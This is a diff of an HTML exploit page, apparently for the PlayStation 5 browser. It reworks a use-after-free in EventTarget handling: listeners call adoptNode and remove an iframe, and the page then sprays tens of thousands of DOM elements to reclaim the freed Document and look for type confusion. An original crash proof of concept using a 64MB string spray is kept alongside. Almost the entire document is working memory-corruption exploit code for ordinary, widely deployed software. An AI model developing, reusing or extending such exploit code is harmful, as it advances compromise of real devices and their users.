@@ -2,103 +2,140 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v54 - EventTarget UAF Pre-alloc</title>
+<title>PS5 v55 - EventTarget DOM Reclaim</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
-button:hover { background: #00ff41; color: #000; }
-button:disabled { opacity: 0.3; cursor: not-allowed; }
 pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<h3>EventTarget UAF — Pre-allocated String</h3>
-<p id="status">Building spray strings... please wait.</p>
+<h3>EventTarget UAF — DOM Object Reclaim</h3>
+<p>Click ONE button. Wait. If browser survives → type confusion achieved.</p>
 
-<div id="buttons" style="display:none">
-<button onclick="triggerUAF('spray32')">Trigger 32MB (Original half)</button>
-<button onclick="triggerUAF('spray64')">Trigger 64MB (Original full size)</button>
-</div>
+<button onclick="testReclaim('div')">Test: Reclaim with DIV elements</button>
+<button onclick="testReclaim('span')">Test: Reclaim with SPAN elements</button>
+<button onclick="testReclaim('p')">Test: Reclaim with P elements</button>
+<button onclick="testReclaim('iframe')">Test: Reclaim with IFRAME elements</button>
+<button onclick="testOriginal()">Test: Original PoC (should crash)</button>
 
 <pre id="out"></pre>
 
 <script>
 var out = document.getElementById("out");
-var status = document.getElementById("status");
-var buttons = document.getElementById("buttons");
 function log(m) { out.textContent += m + "\n"; }
 
-// Pre-allocate strings
-var spray32 = null;
-var spray64 = null;
-
-log("=== Pre-allocating spray strings ===");
-
-try {
-  log("[*] Building 32MB string...");
-  spray32 = 'A'.repeat(1024 * 1024 * 32);
-  log("[+] 32MB string ready (" + spray32.length + " bytes)");
-} catch(e) {
-  log("[-] 32MB failed: " + e.message);
+function testReclaim(tagName) {
+    log("\n[*] Testing reclaim with <" + tagName + "> elements...");
+    log("[*] If browser survives, type confusion achieved!");
+    
+    try {
+        var f = document.body.appendChild(document.createElement('iframe'));
+        var a = document.createElement('div');
+        var b = a.appendChild(document.createElement('div'));
+        
+        // First listener: free the iframe document
+        a.addEventListener('a', function() {
+            document.adoptNode(a);
+            f.remove();
+            // NO throw - no string spray
+        });
+        
+        a.addEventListener('a', function() {});
+        
+        // Second listener: spray DOM elements then access freed memory
+        b.addEventListener('a', function() {
+            // Spray DOM elements to reclaim freed Document slot
+            var spray = [];
+            for (var i = 0; i < 50000; i++) {
+                var elem = document.createElement(tagName);
+                elem.setAttribute('data-id', i);
+                spray.push(elem);
+            }
+            
+            // Now try to access freed memory
+            try {
+                var doc = f.contentDocument;
+                if (doc) {
+                    log("[*] f.contentDocument is NOT null!");
+                    log("[*] doc.nodeType: " + doc.nodeType);
+                    log("[*] doc.nodeName: " + doc.nodeName);
+                    log("[*] doc.documentElement: " + doc.documentElement);
+                    
+                    // Try to read properties that would be corrupted
+                    try {
+                        log("[*] doc.URL: " + doc.URL);
+                    } catch(e) {
+                        log("[!] doc.URL error: " + e.message);
+                    }
+                    
+                    try {
+                        log("[*] doc.title: " + doc.title);
+                    } catch(e) {
+                        log("[!] doc.title error: " + e.message);
+                    }
+                    
+                    try {
+                        log("[*] doc.body: " + doc.body);
+                    } catch(e) {
+                        log("[!] doc.body error: " + e.message);
+                    }
+                    
+                    // Try adoptNode - this is what crashes in original PoC
+                    try {
+                        doc.adoptNode(a);
+                        log("[+] adoptNode SUCCEEDED! No crash!");
+                    } catch(e) {
+                        log("[!] adoptNode error: " + e.message);
+                    }
+                } else {
+                    log("[*] f.contentDocument is null (expected after f.remove())");
+                    log("[*] Checking if f itself is corrupted...");
+                    log("[*] f.tagName: " + f.tagName);
+                    log("[*] f.parentNode: " + (f.parentNode ? f.parentNode.nodeName : "null"));
+                }
+            } catch(e) {
+                log("[!] Access error: " + e.message);
+            }
+        });
+        
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        
+        log("[+] Browser survived! No crash!");
+        log("[+] If data looks weird, we have type confusion.");
+        
+    } catch(e) {
+        log("[!] Exception: " + e.message);
+    }
 }
 
-try {
-  log("[*] Building 64MB string...");
-  spray64 = 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32);
-  log("[+] 64MB string ready (" + spray64.length + " bytes)");
-} catch(e) {
-  log("[-] 64MB failed: " + e.message);
-}
-
-log("");
-log("=== Ready ===");
-status.textContent = "Ready. Click a button below to trigger UAF.";
-buttons.style.display = "block";
-
-function triggerUAF(sprayVar) {
-  var spray = window[sprayVar];
-  if (!spray) {
-    log("[-] Spray string not available");
-    return;
-  }
-  
-  var sizeMB = spray.length / (1024 * 1024);
-  
-  log("\n[*] Triggering UAF with " + sizeMB.toFixed(0) + "MB spray...");
-  log("[*] If browser crashes now, UAF is confirmed!");
-  
-  try {
+function testOriginal() {
+    log("\n[*] Running original PoC (should crash)...");
+    
     var f = document.body.appendChild(document.createElement('iframe'));
     var a = document.createElement('div');
     var b = a.appendChild(document.createElement('div'));
     
-    // Use pre-allocated string
-    a.addEventListener('a', function() {
-      document.adoptNode(a);
-      f.remove();
-      throw {
-        line: 1,
-        column: 1,
-        sourceURL: spray
-      };
-    });
+    a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
+        throw {
+            line: 1,
+            column: 1,
+            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
+        };
+    })`));
     
-    a.addEventListener('a', function() {});
+    a.addEventListener('a', () => {});
     
-    b.addEventListener('a', function() {
-      try {
+    b.addEventListener('a', () => {
         f.contentDocument.adoptNode(a);
-      } catch(e) {}
     });
     
     b.dispatchEvent(new Event('a', { bubbles: true }));
     
-    log("[+] Did not crash at " + sizeMB.toFixed(0) + "MB.");
-    
-  } catch(e) {
-    log("[!] Exception: " + e.message);
-  }
+    log("[+] Original PoC did not crash? Unexpected.");
 }
 </script>
 </body>
